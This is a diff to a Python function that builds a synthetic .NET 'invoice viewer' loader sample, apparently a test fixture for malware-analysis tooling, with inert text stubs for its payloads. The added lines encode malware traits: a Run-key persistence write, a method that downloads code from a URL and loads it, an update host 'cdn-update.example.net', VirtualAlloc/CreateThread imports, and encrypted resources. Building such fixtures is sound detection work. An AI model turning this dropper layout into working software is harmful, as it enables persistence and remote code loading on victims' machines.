@@ -2461,6 +2461,7 @@ def dotnet_loader_exe() -> bytes:
     VirtualAlloc + CreateThread, carries the ConfuserEx marker attribute and an
     AES-encrypted resource (an MZ+text stub); every method body is ``ret``."""
     import binkit as bk
+    import dnkit
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
     stub = b"MZ" + b"inert invoice viewer stage 2 (text, not code) " * 90
     stub += b"\x00" * (-len(stub) % 16)
@@ -2471,14 +2472,21 @@ def dotnet_loader_exe() -> bytes:
             "typerefs": [(0, "System.Reflection", "Assembly"), (None, "", "ConfusedByAttribute"),
                          (1, "System.Net", "WebClient"), (0, "Microsoft.Win32", "RegistryKey"),
                          (0, "System.Security.Cryptography", "RijndaelManaged")],
-            "memberrefs": [(1, ".ctor"), (2, "DownloadData"), (0, "Load"), (3, "SetValue"), (4, "CreateDecryptor")],
+            "memberrefs": [(1, ".ctor"), (2, "DownloadData"), (0, "Load"), (3, "SetValue"), (4, "CreateDecryptor"),
+                           (2, ".ctor")],
             "attributes": [("module", 1)],
-            "types": [{"ns": "InvoiceViewer", "name": "Program", "methods": [{"name": "Main", "entry": True},
-                                                                         {"name": "LoadStage"}]},
+            "types": [{"ns": "InvoiceViewer", "name": "Program", "methods": [
+                {"name": "Main", "entry": True, "ops": [("ldstr", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+                                                        ("ldstr", "InvoiceViewer"), ("callvirt", 3), ("ret",)]},
+                {"name": "LoadStage", "ops": [("newobj", 5), ("ldstr", CODE_URL), ("callvirt", 1), ("call", 2),
+                                              ("pop",), ("ret",)]}]},
                       {"ns": "InvoiceViewer", "name": "NativeMethods",
                        "methods": [{"name": "VirtualAlloc", "pinvoke": ("kernel32.dll", "VirtualAlloc")},
                                    {"name": "CreateThread", "pinvoke": ("kernel32.dll", "CreateThread")}]}],
             "resources": [("InvoiceViewer.Resources.stage2.bin", payload),
+                          ("InvoiceViewer.Properties.Resources.resources", dnkit.resources([
+                              ("UpdateHost", "cdn-update.example.net"),
+                              ("invoice_stage3", b"MZ" + b"inert invoice stage 3 (text, not code) " * 30)])),
                           ("costura.invoicehelper.dll.compressed", _deflate(b"MZ" + b"inert helper library (text) " * 40))],
             "user_strings": [CODE_URL, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "InvoiceViewer",
                              "203.0.113.47"]}
